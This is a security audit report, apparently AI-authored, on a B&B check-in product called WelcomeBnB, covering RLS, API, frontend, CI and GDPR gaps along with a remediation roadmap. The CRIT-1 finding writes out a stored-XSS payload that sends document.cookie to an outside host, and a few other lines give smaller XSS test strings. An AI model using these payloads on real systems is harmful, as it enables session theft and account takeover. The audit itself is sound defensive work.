# WelcomeBnB — Security Assessment

**Date:** 2026-10-24
**Scope reviewed:** entire product at `main` SHA `a2ec7c5`
**Methodology:** 5 parallel audits across database/RLS, backend API, frontend, PII/GDPR/legal compliance, and secrets/dependencies/CI
**Author:** Claude Opus 4.7

> This document is for buyer due diligence, pentest preparation, and the Garante Privacy compliance file. Share freely with prospects, auditors, and legal counsel; the technical findings are the state of the system as of the date above.

---

## 1. Executive summary

The architecture is sound. The gaps are hygiene, not design. WelcomeBnB has a credible security foundation — token-driven scope, RLS with explicit GRANTs, AES-256-GCM for Alloggiati credentials, a schema-drift live gate in CI, soft-delete plus nightly hard-delete, strict token/service-role separation. On top of that foundation, this audit identified **2 CRITICAL findings exploitable today**, **14 HIGH findings any pentester will catch on day one**, and a legal-compliance stack that is 70 % complete but missing the paperwork a serious buyer or the Garante Privacy will ask for.

| Verdict | Status |
|---|---|
| Shippable to pilot customers (today) | ✅ |
| Sellable to small B&Bs (after 2-week critical + HIGH sprint) | ✅ |
| Enterprise / chain / hotel-group buyers (SOC2-adjacent) | ❌ — needs 2–3 month program |
| Garante Privacy compliance audit without a scramble | ⚠️ — needs the GDPR paper trail (DPA, ROPA, breach SOP) |

### Severity rollup

| Severity | Database | Backend API | Frontend | PII/GDPR | Secrets/CI | **Total** |
|---|---|---|---|---|---|---|
| 🟥 Critical | 1 | 0 | 1 | 0 | 0 | **2** |
| 🟧 High | 3 | 2 | 3 | 3 | 3 | **14** |
| 🟨 Medium | 6 | 6 | 3 | 7 | 6 | **28** |
| 🟩 Low | 2 | 5 | 2 | — | 4 | **13** |

---

## 2. 🟥 CRITICAL findings (fix immediately)

### CRIT-1 — Stored XSS: unescaped guest chat on host console

**Where:** `host-console.html:13606, 13611, 13616, 13619` — chat view interpolates `${m.message}` directly into `innerHTML`.

**Attack scenario:** a guest enters chat with `<img src=x onerror="fetch('https://a.io/'+document.cookie)">`. Host opens Ospiti → Chat → script runs in the authenticated host session. Enables full host-account takeover, exfiltration of all guest PII (names, DOB, passport numbers, scanned documents) via Supabase REST, and silent writes.

**Fix:** render chat message bodies through a text node (`div.textContent = m.message`) or escape with the same `escape`/`guestLinkedText` helper `index.html:4599` already uses correctly. The bot bubble's `**bold**` markdown must run *after* escaping, not before. Add a Playwright test that posts `<svg onload=alert(1)>` through chat and asserts no script executes in the host tab.

### CRIT-2 — `get_reservation_keybox` RPC leaks keybox codes across hosts

**Where:** `migration_round36_2_1_ota_keybox.sql`. Function is `SECURITY DEFINER`, GRANT EXECUTE to `authenticated`, body has **no owner check** — just filters by `property_id` and `booking_code`.

**Attack scenario:** any signed-in host who learns another host's `(property_id, booking_code)` pair — these leak in confirmation emails, URLs, OTA webhooks, and support tickets — calls `/rest/v1/rpc/get_reservation_keybox` and reads another property's physical keybox code. This is a physical-access escalation.

**Fix:** add an owner check in the function body or convert to `SECURITY INVOKER` and lean on existing `ota_reservations` RLS. Ship as a migration via the schema-drift gate.

```sql
IF NOT EXISTS (SELECT 1 FROM public.properties
               WHERE id=p_property_id AND owner_id=auth.uid()) THEN
  RAISE EXCEPTION 'Not authorized';
END IF;
```

---

## 3. 🟧 HIGH findings (fix this month)

### Database (3)

- **Anon can call `purge_old_id_photos` and `enqueue_orphan_documents`** — unauthenticated attacker can permanently delete every host's guest photos from Storage. REVOKE EXECUTE from PUBLIC, anon, authenticated. GRANT only to service_role.
- **`list_hosts_for_admin` has EXECUTE granted to PUBLIC.** Guarded by `is_admin()` inside the body, so safe today, but a bug in `is_admin()` becomes a user-enumeration primitive. REVOKE PUBLIC.
- **`marketing_consents` anon INSERT accepts any UUID.** `with_check` is `(property_id IS NOT NULL)` — no property existence check, no email verification, no rate limit. Attacker fabricates proof of consent against any email. Tighten to `EXISTS (SELECT 1 FROM properties …)` plus rate limit plus double opt-in.

### Backend API (2)

- **SSRF via host-controlled iCal feed URLs** (`api/ical-sync.js:285-301, 759-773`). `fetchWithTimeout` follows redirects, no scheme/host filtering. Compromised host account → probes Vercel's internal network and cloud metadata plane. Fix: reject non-`https:`, resolve hostname server-side, refuse RFC1918/127/169.254/::1/fc00::/7, cap redirects at 2, re-validate after each.
- **Error-message disclosure on iCal sync failure.** Raw fetch error strings returned to client — becomes a readable SSRF oracle. Fold errors to a short enum (`timeout`, `http_error`, `parse_error`), log raw server-side only.

### Frontend (3)

- **`safe()` doesn't escape `'`.** Five sites feed `safe(…)` output into single-quoted onclick JS strings. OTA guest name `x',alert(1),'` from Airbnb/Booking.com rebooking → stored XSS. Extend `safe()` to escape `'` and `` ` ``, migrate from inline `onclick="…"` to `addEventListener` + dataset attributes.
- **No Content-Security-Policy.** Any XSS has full browser capability — no `script-src`, no `connect-src`, no exfil restriction.
- **No clickjacking defense.** No `X-Frame-Options`, no `frame-ancestors`. Attacker site iframes `host-console.html`, overlays transparent clickjacks over destructive buttons.

### Secrets / CI (3)

- **Supabase JS loaded unpinned from `cdn.jsdelivr.net` with no SRI.** CDN compromise or a malicious npm patch lands in every host session with full anon-JWT access. Pin exact version plus add `integrity="sha384-…"`. Preferred: self-host as `/vendor/supabase-2.47.10.min.js`.
- **`package-lock.json` is in `.gitignore`.** Builds not reproducible, no SBOM, no diff on transitive-dep changes. Remove ignore, commit lockfile, switch CI from `npm install` to `npm ci`.
- **No automated vulnerability scanning.** No Dependabot, no CodeQL, no `npm audit` in CI. New CVEs go undetected. Add `.github/dependabot.yml` + enable CodeQL + add `npm audit --audit-level=high` as a CI step.

### GDPR / Compliance (3)

- **No breach-notification SOP or DPO contact.** First real incident on prod blows the 72-hour Garante window. Pure process gap.
- **No ROPA (Art. 30 Register of Processing Activities).** Any Garante audit or serious buyer DD fails cheap screening.
- **Minor-consent gate missing.** DOB is captured; `marketing_consents` INSERT runs on the same screen with no age check. GDPR Art. 8 requires parental consent under 16 (IT: 14).

---

## 4. 🟨 MEDIUM findings (fix this quarter)

### Database

- 7 functions with mutable `search_path` (`_pilot_hosts_touch_updated_at`, `anonymize_text`, `compute_season`, `tg_touch_updated_at`, `_ota_reservations_touch_updated_at`, `_tax_rulesets_touch_updated_at`, `checkins_prevent_filed_edit`). Add `SET search_path = public, pg_catalog`.
- `rules` and `recommendations` tables: anon has INSERT/UPDATE/DELETE GRANTs but no matching anon policies — Round 44 silent-write class. REVOKE from anon; gate guest-tile reads through `api/guest.js` with the token scope.
- `pg_net` extension installed in `public` — move to a dedicated `net` schema and REVOKE USAGE from anon/authenticated.
- Supabase Auth HaveIBeenPwned leaked-password check disabled; enable in Auth → Policies.
- `property-images` Storage bucket has no `file_size_limit` or `allowed_mime_types`. Set 5 MB cap and `image/jpeg|png|webp` only.
- Legacy "Allow anonymous uploads" policy on `storage.objects` is confusingly permissive-looking (inert today, delete it).

### Backend API

- `api/send-arrival-reminders.js:77` non-constant-time secret compare — use `_constantTimeEq`.
- Fail-open rate limiters on anonymous endpoints — brief Supabase hiccup opens a throttle-free window. Fail-closed for anon/guest-token paths.
- `api/guest-token.js` existence oracle — attacker-chosen `session_id` enables property enumeration at ~20/hr/session. Tie limit to IP+UA fingerprint, or move verification behind a signed guest-link token.
- `api/scan-document.js:122` leaks upstream Anthropic error body to client — generic client message, structured log server-side.
- `api/_notify-host.js:481` service-role reads `/auth/v1/admin/users` to fetch host email — narrow to a dedicated SECURITY DEFINER RPC that returns `{email}` only.
- PII in Vercel logs (tokens, response bodies) — add log-scrubbing middleware.

### Frontend

- No SRI on CDN scripts; pin exact versions and add `integrity=` hashes.
- Missing security response headers (HSTS preload, Referrer-Policy, Permissions-Policy, X-Content-Type-Options).
- Client-side admin gating (`_adminEditEnabled`) relies entirely on RLS — defense-in-depth gap. Add server-side role check RPC the UI gates on.

### GDPR

- No DSAR self-service — a request landing on `info@welcomebnb.it` has no runbook or JSON-export tool.
- No DPA template on disk for host ↔ WelcomeBnB (Art. 28). Hosts are nominally non-compliant without a signed processor agreement.
- **Telegram sub-processor undisclosed** in privacy notice (code paths exist in `api/telegram-link.js`, `telegram-webhook.js`).
- `door_code` and `keybox_code` plaintext in `properties` — not guest PII, but a host-side secret exposed by any DB leak. Encrypt with the Alloggiati key framework.
- No admin audit log for impersonation; add `admin_access_events` table (retained 2 y).
- No backup / PITR restore drill documented.
- Purge-cron health monitoring absent — the 2026-05 silent failure (158 photos kept past 48 h) can repeat; fail the daily reminder run if `data_purge_log` hasn't advanced in 48 h.

### Secrets / CI

- GitHub Actions pinned to tags not SHAs — tag re-point attacks (e.g. the `tj-actions/changed-files` CVE-2025-30066 pattern).
- `SUPABASE_SERVICE_ROLE_KEY` not scoped to a GitHub Environment with required reviewers — any workflow in the repo can read it.
- No `vercel.json` security headers.
- No `SECURITY.md` / responsible disclosure email.
- Signed commits not enforced on `main`.
- No secret-rotation runbook (14 server env vars; no documented quarterly process).

---

## 5. 🟩 LOW findings and INFO

### Database

- Round-48 probe policies left behind on `checkins` / `storage.objects` (`qual=false`, inert) — drop them in the next migration.
- 2 tables with RLS enabled and no policies (`storage_purge_queue`, `telegram_link_tokens`) — intentionally service-role-only; the advisor is noisy.

### Backend API

- `telegram-webhook.js:117` outbound `_reply` ignores TLS/body errors silently.
- Request-body size caps inconsistent (`admin-invite-host.js:53` 4 KB; `scan-document.js:16` ~14 MB; `chat.js` / `guest.js` uncapped).
- No HMAC body signature on Vercel cron requests (Bearer token only).
- Alloggiati `v2` key-rotation path not yet implemented.
- Portal-link `href` build in `host-regional-exports.js` doesn't filter `javascript:` schemes (safe today — portal URLs are static).

### Frontend

- `target="_blank"` without `rel="noopener"` on `admin.html:3431` and `index.html:1520` — reverse-tabnabbing.
- Supabase anon JWT in `app-config.js` — by design, but document in SECURITY.md so auditors don't flag it.

### Secrets / CI

- Internal `api/_*.js` modules are technically routable under Vercel's `/api/` convention — move to `/lib/` or add exclusion in `vercel.json`.
- Chat and scan endpoints have no per-property per-hour rate budget on Anthropic calls — attacker can drain monthly budget.
- `app-config.js` embeds anon JWT literally — public by design, document.
- No pre-commit secret scanner (gitleaks / trufflehog).

### INFO / positive

- Workflow uses `pull_request:` (not `pull_request_target:`) — fork PRs cannot read secrets. Correct.
- `scripts/demo-live-smoke.mjs` asserts `sb_secret_` and `service_role` are absent from public responses — continuous assertion of the service-role boundary.
- `npm audit` = 0 across all 39 deps.

---

## 6. ✅ What's already defensibly done

The product is **not** a security-poor codebase. Buyers and auditors should see the following as positives:

- **Token-driven guest scope:** HMAC-SHA256 payload + base64url + constant-time compare + explicit expiry. `api/guest.js` reads scope *only* from the signed payload, never body.
- **Alloggiati credentials: AES-256-GCM at rest** with per-row nonces and key-id for rotation. Separation of titolare (host) vs responsabile (WelcomeBnB) declared correctly.
- **Round 60c photo retention down to 7 days** aligned with the Garante Privacy April 2026 note. Serious, defensible choice.
- **Explicit CORS origin allowlist** (no `.vercel.app` regex). `OPTIONS` fails closed on disallowed origin.
- **Service-role key never crosses the browser boundary** — asserted by `demo-live-smoke` on every live-tier run.
- **Owner-scoped RLS everywhere multi-tenant** — `properties`, `checkins`, `ota_reservations`, `property_rooms`, `chat_messages`, `host_notification_settings`, `push_subscriptions`, `recommendations` writes, `rules` writes — with the Round 44 "GRANT without policy = silent 0-row" lesson encoded in subsequent migrations.
- **Round 60b schema-drift live gate** catches committed-but-never-applied migrations in CI. Rare and valuable.
- **Branch protection on main** with regression CI as a required check.
- **`host_alloggiati_credentials`** deny-all for anon and authenticated — only service_role touches credentials.
- **Minimal dependency tree** (1 runtime dep, 3 dev-deps) materially reduces attack surface vs. a typical SaaS stack.
- **Guest flow is well-engineered**: single escape helper, strict linkifier with protocol allowlist, URL validator rejecting `javascript:`, sessionStorage-scoped tokens with 12 h expiry.
- **Test-mode isolation** (`is_test=true` plus demo project `wmegnnlmcrabndyzywmj`) prevents real-prod bleed.

---

## 7. Roadmap to sellable, defensible

### ⚡ 30-day sprint (minimum before paid customers)

**Week 1–2 — Fix the exploitable stuff:**

1. CRIT-1 — escape chat `innerHTML`
2. CRIT-2 — add owner check to `get_reservation_keybox`
3. 3 database HIGHs — REVOKE anon/PUBLIC from cron functions; lock down `marketing_consents`
4. 2 backend HIGHs — SSRF guard + error-folding on `ical-sync.js`
5. Frontend `safe()` quote gap + CSP + X-Frame-Options

**Week 3–4 — Hygiene foundation:**

6. `vercel.json` with CSP, HSTS preload, Referrer-Policy, X-Content-Type-Options
7. Pin Supabase JS SRI + exact version everywhere
8. Commit `package-lock.json`, switch CI to `npm ci`
9. Add Dependabot (weekly, npm + github-actions)
10. Add `SECURITY.md` + `security@welcomebnb.it` mailbox
11. Pin all GitHub Actions to SHAs
12. Move `SUPABASE_SERVICE_ROLE_KEY` into a `production` GitHub Environment

### 📋 90-day program (before any enterprise B&B chain pitch)

13. `docs/ROPA.md` — Register of Processing Activities (Art. 30)
14. `docs/BREACH_SOP.md` — Breach notification SOP, 72-hour clock, Garante template
15. `docs/SECURITY_RUNBOOK.md` — secret rotation (quarterly), incident response, backup drill
16. DPA template (host ↔ WelcomeBnB, Art. 28) — PDF + onboarding click-wrap
17. DSAR self-service — `api/dsar.js` returns signed JSON bundle; host-side erasure button that respects Alloggiati's 5 y legal hold
18. Processor registry page listing Supabase / Vercel / Anthropic / Resend / **Telegram** with location + SCC references
19. Minor-consent gate on marketing consents
20. Admin audit log (`admin_access_events` table, retained 2 y)
21. Encrypt `door_code` / `keybox_code` with the Alloggiati key framework
22. Log-scrubbing middleware (strip emails/tokens before `console.*`)
23. Rate-limit at Vercel Firewall level on `/api/guest-token`, `/api/scan-document`, `/api/chat`
24. Quarterly key-rotation drill, documented
25. Backup/PITR restore drill, documented
26. CodeQL enabled + gitleaks nightly
27. Enforce signed commits on `main`
28. Third-party **penetration test** (CROW / Cobalt / HackerOne scoped, ~€3-8 k). After the 90-day work, this is the letter you hand to buyers.

### 🏢 Enterprise-ready (6+ months, when revenue justifies)

29. SOC 2 Type 1 engagement
30. ISO 27001 Stage-1 readiness assessment (~€20 k)
31. Signed audit log with hash chain per host (anchors "we can prove what we filed with Alloggiati")
32. 2FA enforcement for host accounts; admin session timeout; IP allowlist for admin surface
33. KMS-backed secrets (Vercel + GCP KMS, or Doppler)
34. SBOM attached to each release (`cyclonedx-npm`)
35. Public status page + bug-bounty with Intigriti or similar

---

## 8. Compliance posture snapshot (GDPR + Italian hospitality)

| Area | Today | After 90-day program |
|---|---|---|
| Lawful basis (Art. 6) | 🟢 | 🟢 |
| Transparency / informativa (Art. 13-14) | 🟢 | 🟢 |
| Data minimisation (Art. 5.1.c) | 🟢 | 🟢 |
| Storage limitation (Art. 5.1.e) | 🟡 | 🟢 (with purge monitoring) |
| Right of access / rectification (Art. 15-16) | 🟡 | 🟢 |
| Right of erasure (Art. 17) | 🟡 | 🟢 |
| Right of portability (Art. 20) | 🔴 | 🟢 |
| Breach notification (Art. 33-34) | 🔴 | 🟢 |
| Processor obligations (Art. 28) — DPA | 🟡 | 🟢 |
| ROPA (Art. 30) | 🔴 | 🟢 |
| International transfers (Art. 44-49) | 🟡 (Telegram undeclared) | 🟢 |
| TULPS Art. 109 (Alloggiati) | 🟢 | 🟢 |
| CIN / BDSR (DL 145/2023) | 🟢 | 🟢 |
| Minors (Art. 8) | 🔴 | 🟢 |

---

## 9. Bottom line for the sales story

The backend architecture — Supabase RLS plus explicit GRANTs plus schema-drift live gate plus 7-day photo retention plus Alloggiati AES-GCM plus token-scoped guest flow — is **already strong and tells a credible story**. The gaps are:

1. **Two exploitable XSS / RBAC bugs** (CRIT-1 and CRIT-2 above) — ship fixes this week before any public pitch.
2. **The browser surface** (CSP, SRI, clickjacking) — one `vercel.json` plus a 1-day inline-handler migration.
3. **The GDPR paper trail** (ROPA, DPA, Breach SOP, DSAR) — the technical foundations exist; what's missing is the documents a buyer and the Garante actually look at.

Round 65 is proposed as the structured sprint to close items 1–12 of the 30-day roadmap. See `PLAN_round65_security_hardening.md`.
